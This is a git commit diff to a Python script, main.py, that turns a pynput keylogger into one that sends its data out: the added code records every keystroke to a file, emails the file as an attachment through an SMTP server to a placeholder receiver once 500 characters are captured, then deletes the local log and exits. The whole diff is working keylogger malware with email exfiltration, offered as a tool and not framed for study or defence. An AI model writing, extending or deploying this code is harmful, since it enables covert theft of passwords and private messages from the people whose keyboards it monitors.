b8fb46dde9cccfed36e1937aab608f9f3b08c29e
Filo <102966772+filoflea93@users.noreply.github.com>
2022-10-16 14:37:44 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,11 +1,22 @@
 from pynput import keyboard
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+import email
+import time
+import os
 
 
-maxChar = 5
+maxChar = 500
 maxSpaces = 10
 nspaces = 0
 nchar = 0
 text = ""
+
+MY_ADDRESS = <YOUR ADDRESS>
+PASSWORD = <YOUR PASSWORD>
+TO = <RECEIVER>
+HOST = <SERVER HOST>
 
 
 def switch(var):
@@ -23,15 +34,15 @@ def switch(var):
     if var == keyboard.Key.esc:
         return "[ESC]"
     if var == keyboard.Key.shift:
-        return "[SHIFT]" 
+        return "[SHIFT]"
     if var == keyboard.Key.alt:
-        return "[ALT]" 
+        return "[ALT]"
     if var == keyboard.Key.alt_gr:
-        return "[ALT_GR]" 
+        return "[ALT_GR]"
     if var == keyboard.Key.cmd:
-        return "[CMD]" 
+        return "[CMD]"
     if var == keyboard.Key.caps_lock:
-        return "[CAPS_LOCK]" 
+        return "[CAPS_LOCK]"
     if var == keyboard.Key.ctrl:
         return "[CTRL]"
     if var == keyboard.Key.down:
@@ -44,7 +55,6 @@ def switch(var):
         return "[LEFT]"
     if var == keyboard.Key.enter:
         return "\n"
-
 
 def on_press(key):
 
@@ -78,21 +88,60 @@ def on_press(key):
     try:
         if special:
             text = text + specialchar
+            charToAdd = specialchar
         else:
             text = text + key.char
+            charToAdd = key.char
     except:
         text = text + "[SPECIAL_CHAR]"
+        charToAdd = "[SPECIAL_CHAR]"
 
-    print(text)
-
-    with open('log.txt', 'a') as f:
-        f.write(text)
-        text = ""
+    filename = 'log.txt'
+    with open(filename, 'a') as f:
+        f.write(charToAdd)
         f.close()
 
     if nchar == maxChar:
         nchar = 0
+        mailSent = sendMail(filename)
+        if mailSent:
+            PATH = os.getcwd() + "\\" + filename
+            os.remove(PATH)
+            quit()
+        else:
+            quit()
+
+
+def sendMail(filename):
+    global MY_ADDRESS,PASSWORD,HOST,TO
+
+    try:
+        msg = MIMEMultipart()
+        msg['Subject'] = 'subject'
+        msg['From'] = MY_ADDRESS
+        msg['To'] = TO
+        file = filename
+
+        attachment = MIMEBase('application', 'octet-stream')
+        attachment.set_payload(open(file, 'rb').read())
+        email.encoders.encode_base64(attachment)
+        attachment.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file))
+        msg.attach(attachment)
+
+        s = smtplib.SMTP(HOST, 587)
+        s.ehlo()
+        s.starttls()
+        s.ehlo()
+        s.login(MY_ADDRESS, PASSWORD)
+        s.sendmail(MY_ADDRESS, TO, msg.as_string())
+        s.quit()
+        return True
+    except:
+        s.quit()
+        return False
 
 listener = keyboard.Listener(on_press=on_press)
 listener.start()  # start to listen on a separate thread
 listener.join()  # remove if main thread is polling self.keys
+
+
